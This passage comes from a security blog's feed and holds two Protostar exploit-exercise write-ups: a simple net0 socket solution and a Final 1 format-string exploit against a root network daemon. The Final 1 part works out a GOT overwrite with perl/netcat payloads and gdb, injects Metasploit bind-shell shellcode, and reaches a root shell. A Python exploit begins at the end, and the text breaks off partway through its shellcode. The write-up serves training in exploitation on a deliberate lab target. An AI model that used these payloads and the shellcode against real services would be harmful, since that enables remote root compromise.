&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;

#define NAME &amp;quot;net0&amp;quot;
#define UID 999
#define GID 999
#define PORT 2999

void run()
{
 unsigned int i;
 unsigned int wanted;

 wanted = random();

 printf(&amp;quot;Please send &#39;%d&#39; as a little endian 32bit int\n&amp;quot;, wanted);

 if(fread(&amp;amp;i, sizeof(i), 1, stdin) == NULL) {
  errx(1, &amp;quot;:(\n&amp;quot;);
 }

 if(i == wanted) {
  printf(&amp;quot;Thank you sir/madam\n&amp;quot;);
 } else {
  printf(&amp;quot;I&#39;m sorry, you sent %d instead\n&amp;quot;, i);
 }
}

int main(int argc, char **argv, char **envp)
{
 int fd;
 char *username;

 /* Run the process as a daemon */
 background_process(NAME, UID, GID); 

 /* Wait for socket activity and return */
 fd = serve_forever(PORT);

 /* Set the client socket to STDIN, STDOUT, and STDERR */
 set_io(fd);

 /* Don&#39;t do this :&amp;gt; */
 srandom(time(NULL));

 run();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I started to analyze this program, to figure out what I was even supposed to do.  It looks like it&amp;rsquo;s a daemon that runs on port 2999.  When a connection is established, it will send a number, asking for it to be returned in little endian format.  It will either then display &amp;ldquo;Thank you sir/madam&amp;rdquo; or &amp;ldquo;I&amp;rsquo;m sorry, you send X instead&amp;rdquo;.  My goal was the prior.&lt;/p&gt;

&lt;p&gt;I ended up creating the following code to convert the number to little endian and send it back:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python

# Protostar Net 0
# http://exploit-exercises.com/protostar/net0
# Matt Andreko
# twitter: @mandreko
# contact: matt [at] mattandreko.com

from socket import *
from struct import *
from optparse import OptionParser

def main(host, port):

 # Open a connection and read
 s = socket(AF_INET, SOCK_STREAM)
 s.connect((host, port))

 data = s.recv(1024)
 print &amp;quot;[*] Data: &amp;quot; + data

 # Find the numeric string.
 # Note it can be variable length, so search between quotes
 start = data.find(&amp;quot;&#39;&amp;quot;) + 1
 end = data.find(&amp;quot;&#39;&amp;quot;, start)

 num = int(data[start:end])
 print &amp;quot;[*] Num: &amp;quot; + str(num)

 # Convert the number to little endian format and send it back
 little = pack(&amp;quot;&amp;lt;I&amp;quot;, num)
 s.send(little)

 # Read response from server
 print s.recv(1024)
 s.close()

if __name__ == &amp;quot;__main__&amp;quot;:
    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, 
     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2999, 
     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)

    (options, args) = parser.parse_args()
    
    main(options.hostname, options.portnum)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When ran, that program produced the following output:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\Protostar&amp;gt;net0.py -H 192.168.1.132
[*] Data: Please send &#39;634513062&#39; as a little endian 32bit int

[*] Num: 634513062
Thank you sir/madam
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Final 1</title>
      <link>http://test.andreko.net/2012/02/05/exploit-exercises---protostar-final-1/</link>
      <pubDate>Sun, 05 Feb 2012 15:15:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/02/05/exploit-exercises---protostar-final-1/</guid>
      <description>&lt;p&gt;Since I&amp;rsquo;ve been doing a lot of the format string exploits lately, I decided to do the &lt;a href=&#34;http://exploit-exercises.com/protostar/final1&#34;&gt;Final 1&lt;/a&gt; challenge.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We start out the challenge by being given the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;

#include &amp;lt;syslog.h&amp;gt;

#define NAME &amp;quot;final1&amp;quot;
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
 char buf[512];

 snprintf(buf, sizeof(buf), &amp;quot;Login from %s as [%s] with password [%s]\n&amp;quot;, hostname, username, pw);

 syslog(LOG_USER|LOG_DEBUG, buf);
}

void trim(char *str)
{
 char *q;

 q = strchr(str, &#39;\r&#39;);
 if(q) *q = 0;
 q = strchr(str, &#39;\n&#39;);
 if(q) *q = 0;
}

void parser()
{
 char line[128];

 printf(&amp;quot;[final1] $ &amp;quot;);

 while(fgets(line, sizeof(line)-1, stdin)) {
  trim(line);
  if(strncmp(line, &amp;quot;username &amp;quot;, 9) == 0) {
   strcpy(username, line+9);
  } else if(strncmp(line, &amp;quot;login &amp;quot;, 6) == 0) {
   if(username[0] == 0) {
    printf(&amp;quot;invalid protocol\n&amp;quot;);
   } else {
    logit(line + 6);
    printf(&amp;quot;login failed\n&amp;quot;);
   }
  }
  printf(&amp;quot;[final1] $ &amp;quot;);
 }
}

void getipport()
{
 int l;
 struct sockaddr_in sin;

 l = sizeof(struct sockaddr_in);
 if(getpeername(0, &amp;amp;sin, &amp;amp;l) == -1) {
  err(1, &amp;quot;you don&#39;t exist&amp;quot;);
 }

 sprintf(hostname, &amp;quot;%s:%d&amp;quot;, inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
 int fd;
 char *username;

 /* Run the process as a daemon */
 background_process(NAME, UID, GID); 

 /* Wait for socket activity and return */
 fd = serve_forever(PORT);

 /* Set the client socket to STDIN, STDOUT, and STDERR */
 set_io(fd);

 getipport();
 parser();

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After analyzing this for a while, I found that it was vulnerable in the logit() function.  If you had given it a username and went to login with a password, it would pass the &amp;ldquo;login&amp;rdquo; string directly to the &amp;ldquo;snprintf&amp;rdquo; funciton.  From there, we could do format string exploits.  There are probably more than one way to solve this, but my method involves overwriting the &amp;ldquo;syslog()&amp;rdquo; function with some shellcode inserted into the stack.&lt;/p&gt;

&lt;p&gt;I started to tinker with the app to see what I could do.  One thing I found really convenient, was to open another terminal throughout this entire process, and watch the syslog.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# tail -f /var/log/syslog | grep final1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This helps to see what is being passed, and align the format string later on.  It also notifies you when you crash the program, and dump the core.&lt;/p&gt;

&lt;p&gt;First, I needed to find the amount of words in the stack that I would need to skip over to get to my format string.  I found through some experimentation that it would start at 15 if I added a 1 character buffer (the &amp;ldquo;X&amp;rdquo;):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ nc localhost 2994
[final1] $ username XAAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
[final1] $ login B
login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 22:47:31 protostar final1: Login from 127.0.0.1:36764 as [JAAAA8049ee4.804a2a0.804a220.bffffc46.b7fd7ff4.bffffa98.69676f4c.7266206e.31206d6f.302e3732.312e302e.3736333a.61203436.4a5b2073.41414141] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Since my goal was to overwrite &amp;ldquo;syslog()&amp;rdquo; with a memory address pointing to my shellcode, I figured I probably needed to know the address of &amp;ldquo;syslog()&amp;rdquo; in the GOT.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -R final1 | grep syslog
0804a11c R_386_JUMP_SLOT   syslog
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My next step was to start using Direct Parameter Access, so my exploit wouldn&amp;rsquo;t be super long, and would be easier to deal with.  I also broke up the segments to make them easier for me to visualize.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;AAAA&amp;quot;.&amp;quot;BBBB&amp;quot;.&amp;quot;CCCC&amp;quot;.&amp;quot;DDDD&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:18:13 protostar final1: Login from 127.0.0.1:36768 as [XAAAABBBBCCCCDDDD41414141] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So there, I was still getting the &amp;ldquo;41414141&amp;rdquo; as the word being displayed.  When switched to &amp;ldquo;%n&amp;rdquo; instead of &amp;ldquo;%x&amp;rdquo;, that&amp;rsquo;ll be the address written to.  The next thing to do, would be make all 4 words show up properly.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;AAAA&amp;quot;.&amp;quot;BBBB&amp;quot;.&amp;quot;CCCC&amp;quot;.&amp;quot;DDDD&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;%16\$x&amp;quot;.&amp;quot;%17\$x&amp;quot;.&amp;quot;%18\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:23:17 protostar final1: Login from 127.0.0.1:36769 as [XAAAABBBBCCCCDDDD41414141424242424343434344444444] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So you can see, it is now displaying the 4 words that are needed to be overwritten, &amp;ldquo;41414141&amp;rdquo;, &amp;ldquo;42424242&amp;rdquo;, &amp;ldquo;43434343&amp;rdquo;, and &amp;ldquo;44444444&amp;rdquo;.  If the address of &amp;ldquo;syslog()&amp;rdquo; (0x0804a11c) in the GOT is used, instead of these addresses, we can achieve an overwrite of &amp;ldquo;syslog()&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Just to double-check, I put in the new addresses without the &amp;ldquo;%n&amp;rdquo; so that I could verify nothing was messed up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;%16\$x&amp;quot;.&amp;quot;%17\$x&amp;quot;.&amp;quot;%18\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:27:12 protostar final1: Login from 127.0.0.1:36770 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010804a11c804a11d804a11e804a11f] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Towards the end, you can see all the memory addresses being written out.&lt;/p&gt;

&lt;p&gt;The next logical step would be to replace the &amp;ldquo;%x&amp;rdquo; with &amp;ldquo;%n&amp;rdquo;, and watch the program crash, as we try to write arbitrary values to the &amp;ldquo;syslog()&amp;rdquo; memory space before it gets called.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:30:50 protostar final1: Login from 127.0.0.1:36772 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is not at all what I was expecting!  No crash, it tried to do the login.  But wait!  If I tried to continue sending commands in that same session, it seemed to have been messed up, since it does not even function properly, outputting the &amp;ldquo;[final1] $&amp;rdquo; string:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[final1] $ username A
login B
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I figured that maybe I had crashed it, and a core had been dumped.  But nothing appeared:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ls /tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I started tinkering, and decided to try having it login a second time, repeating the &amp;ldquo;login&amp;rdquo; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin B\nlogin TEST2\n&amp;quot;&#39; | nc localhost 2994
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:37:49 protostar final1: Login from 127.0.0.1:36773 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [B]
Feb  4 23:37:49 protostar kernel: [984582.054370] final1[24813]: segfault at 30303030 ip 30303030 sp bffff9fc error 4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There we go, we have a segfault, which should have dumped a core for us to debug.  This is convenient, since if the overwrite of &amp;ldquo;syslog()&amp;rdquo; doesn&amp;rsquo;t happen until the second login attempt, we&amp;rsquo;ll need to know where &amp;ldquo;TEST2&amp;rdquo; was in memory, to inject shellcode.  NOTE: To debug in gdb, you will have to use the root login.  Per &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;http://exploit-exercises.com/protostar&lt;/a&gt; &amp;ldquo;For debugging the final levels, you can log in as root with password &amp;ldquo;godmode&amp;rdquo; (without the quotes)&amp;ldquo;.&lt;/p&gt;

&lt;p&gt;This also made me remember, that since we are going to put shellcode in where &amp;ldquo;TEST2&amp;rdquo; is, the stack address will change, since the shellcode will probably be more than 5 characters long.  So this needs to be done again with a proper length shellcode.  That means the first step towards getting this, should be generating some shellcode.  I connected to a machine with the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&lt;/a&gt; installed, and generated some:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfpayload linux/x86/shell_bind_tcp c
/*
* linux/x86/shell_bind_tcp - 78 bytes
* http://www.metasploit.com
* VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false,
* PrependSetreuid=false, PrependSetuid=false,
* PrependChrootBreak=false, AppendExit=false,
* InitialAutoRunScript=, AutoRunScript=
*/
unsigned char buf[] =
&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot;
&amp;quot;\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot;
&amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot;
&amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot;
&amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot;
&amp;quot;\x0b\xcd\x80&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I wired up a new string to send to the program, using the username of the exploit format string for the first username, and a &amp;ldquo;B&amp;rdquo; for the password.  The second login attempt would set the username to &amp;ldquo;X&amp;rdquo;, as to not trigger the format string again, and a password containing a fake shellcode, of 78 &amp;ldquo;A&amp;rdquo;s.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin &amp;quot;.&amp;quot;B&amp;quot;x120 .&amp;quot;username X\nlogin &amp;quot;.&amp;quot;A&amp;quot;x78 .&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  5 00:03:58 protostar final1: Login from 127.0.0.1:36775 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [Busername X]
Feb  5 00:03:58 protostar kernel: [986148.949635] final1[24854]: segfault at 30303030 ip 30303030 sp bffff9fc error 4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now to debug as root, to find the start of the shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ su
Password:
root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24854
Core was generated by `/opt/protostar/bin/final1&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x30303030 in ?? ()
(gdb) x/10s $esp
0xbffff9fc:      &amp;quot;\357\230\004\b\017&amp;quot;
0xbffffa02:      &amp;quot;&amp;quot;
0xbffffa03:      &amp;quot;&amp;quot;
0xbffffa04:      &amp;quot; \372\377\277\344\236\004\b\240\242\004\b \242\004\bF\374\377\277\364\177\375\267\230\372\377\277Login from 127.0.0.1:36775 as [X\034\241\004\b\035\241\004\b\036\241\004\b\037\241\004\b%15$n%16$n%17$n%18$n] with password [&amp;quot;, &#39;A&#39; &amp;lt;repeats 78 times&amp;gt;, &amp;quot;]\n&amp;quot;
0xbffffac6:      &amp;quot;\377\277(\033\376\267\021&amp;quot;
0xbfffface:      &amp;quot;&amp;quot;
0xbffffacf:      &amp;quot;&amp;quot;
0xbffffad0:      &amp;quot;\024\310\351\267\374\032\376\267\021{\234|\001&amp;quot;
0xbffffade:      &amp;quot;&amp;quot;
0xbffffadf:      &amp;quot;&amp;quot;
(gdb) x/1s 0xbffffac6-81
0xbffffa75:      &#39;A&#39; &amp;lt;repeats 78 times&amp;gt;, &amp;quot;]\n&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now we know that we should be able to overwrite 0x0804a11c with 0xbffffa75 to make &amp;ldquo;syslog()&amp;rdquo; call our shellcode.  We just need to calculate the buffer lengths to get &amp;ldquo;0xbrffffa75&amp;rdquo; to actually show up instead of &amp;ldquo;0x30303030&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p 0x75 - 0x30
$1 = 69
(gdb) p 0xfa - 0x75
$2 = 133
(gdb) p 0xff - 0xfa
$3 = 5
(gdb) p 0x1ff - 0xfa
$4 = 261
(gdb) p 0xbf - 0xff
$5 = -64
(gdb) p 0x1bf - 0xff
$6 = 192
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This tells us, that with our 4 &amp;ldquo;%n&amp;rdquo;s, we should be able to use buffer lengths of 69, 133, 261, and 192.  So let&amp;rsquo;s wire that up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%69x%15\$n&amp;quot;.&amp;quot;%133x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;A&amp;quot;x78 .&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  5 00:14:14 protostar final1: Login from 127.0.0.1:36776 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010                                                              8049ee4                                                                                                                              804a2a0                                                                                                                                                                                                                                                              804a220                                                                                                                                                                                        bffffc46] with password [Busername X]
Feb  5 00:14:14 protostar kernel: [986763.710440] final1[24875]: segfault at 69 ip bffffa78 sp bffffa00 error 6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we launch gdb again, we can see where it crashed, and cross our fingers that it was when trying to execute our fake shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ su
Password:
root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24875
Core was generated by `/opt/protostar/bin/final1&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xbffffa78 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It would appear that our assumption was correct.  It tried to run starting at 0xbffffa75, and made it to 0xbffffa78 before segfaulting.  Let&amp;rsquo;s now replace the fake shellcode with real shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%69x%15\$n&amp;quot;.&amp;quot;%133x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;.&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, this appeared to segfault as well, based on the syslog output, so again, I loaded it in gdb:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24894
Core was generated by `/opt/protostar/bin/final1&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xbffffa78 in ?? ()
(gdb) x/1x 0x0804a11c
0x804a11c:      0xbffffa75
(gdb) x/1s 0xbffffa75
0xbffffa75:      &amp;quot;$n] with password [1\333\367\343SCSj\002\211\341\260fÍ[^Rh\377\002\021\\j\020QP\211\341jfXÍ\211A\004\263\004\260fÍC\260fÍ\223Yj?XÍIy\370h//shh/bin\211\343PS\211\341\260\vÍ]\n&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;First, I made sure that the address of the &amp;ldquo;syslog()&amp;rdquo; function in the GOT was overwritten by the correct address, which it was.  I then realized that the length was off, since I changed the buffers to output the address.  This means the address would have to change, and the buffers as well again.  So I found the shellcode, and corrected the address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) x/8x 0xbffffa75+19
0xbffffa88:     0xe3f7db31      0x6a534353      0xb0e18902      0x5b80cd66
0xbffffa98:     0xff68525e      0x6a5c1102      0x89505110      0x58666ae1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It now needs to jump to 0xbffffa88&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p 0x88 - 0x30
$1 = 88
(gdb) p 0xfa - 0x88
$2 = 114
(gdb) p 0xff - 0xfa
$3 = 5
(gdb) p 0x1ff - 0xfa
$4 = 261
(gdb) p 0xbf - 0xff
$5 = -64
(gdb) p 0x1bf - 0xff
$6 = 192
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So our new buffer offsets should be 88, 114, 261, and 192:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%88x%15\$n&amp;quot;.&amp;quot;%114x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;.&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  5 00:27:15 protostar final1: Login from 127.0.0.1:36781 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010                                                                                 8049ee4                                                                                                           804a2a0                                                                                                                                                                                                                                                              804a220                                                                                                                                                                                        bffffc46] with password [Busername X]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No segfault means maybe it worked.  Let&amp;rsquo;s attempt to connect on port 4444:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ nc localhost 4444
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it, root access!  However, this only works on the local machine, since the syslog string contaisn your ip address and port that you used to connect.  This means that if you connect from outside hosts, the format string will be wrong.  I decided to fix this, by writing this out as a &amp;ldquo;true&amp;rdquo; exploit, instead of just a perl pipe.  This was both for fun, and to try getting better at writing actual &amp;ldquo;exploits&amp;rdquo; that I could publish.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python

# Protostar Final 1 Exploit
# http://exploit-exercises.com/protostar/final1
# Matt Andreko
# twitter: @mandreko
# contact: matt [at] mattandreko.com

from socket import *
from struct import *
from optparse import OptionParser

def exploit(host, port):
    syslog_address = 0x0804a11c
    syslog_address_1 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address)
    syslog_address_2 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 1)
    syslog_address_3 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 2)
    syslog_address_4 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 3)

    # linux/x86/shell_bind_tcp - 78 bytes
    # http://www.metasploit.com
    # VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false,
    # PrependSetreuid=false, PrependSetuid=false,
    # PrependChrootBreak=false, AppendExit=false,
    # InitialAutoRunScript=, AutoRunScript=
    shellcode = &amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot; \
                &amp;quot;\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot; \
